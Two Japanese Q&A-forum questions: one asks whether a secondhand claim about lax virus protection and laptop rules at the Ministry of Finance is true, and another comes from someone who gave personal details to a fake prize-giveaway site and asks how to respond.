「財務省のウイルス感染について」という質問があったのですが、一部の回答の中で 「外部回線の出入口に「ウィルスを通さないハードウェア（装置）を入れている」のです。 省内で使われている個々のPCは「何の対策も取られてない、素の状態」です。 なので「何の対策もされてないノートPCを自宅に持って帰って、自宅で感染して、自宅から情報漏洩」なんて事件が後を絶たないのです。 基本、ノートPCは、持ち込みも持ち出しも禁止の筈なんですが、誰も守ってません」 といった書き込みを見ました。 これは間違いないのですよね？ 書かれた人が現認したからでしょうか。あるいは現場の職員を知っていて伝聞で知り得たのでしょうか。 その辺のことを説明して頂きたく思います。 どうぞ宜しくお願いいたします。
先ほどツイッターの壁紙を海外のサイトで探していたら、画面の右側に「あなたは888，888人目の訪問者です」と書かれ、アップル製品が無料であたるという項目（http://www.free-choice-japan.com/cgi-bin/wingame …）があったので私は迂闊にもアクセスをし、個人情報を載せてしまいました。 そのあとに無言の電話がかかってきたので、不審に思ってfree-choice-japanについて調べてところ、アップル製品を手に入れられる手口の詐欺をしていることを知りました。 自分の撒いた種ですが、今どのようなことをしたらいいかわからず困っています。 どのような対処をしたらいいでしょうか？ もしできましたら早めに回答していいただたら助かります。 お願いします！
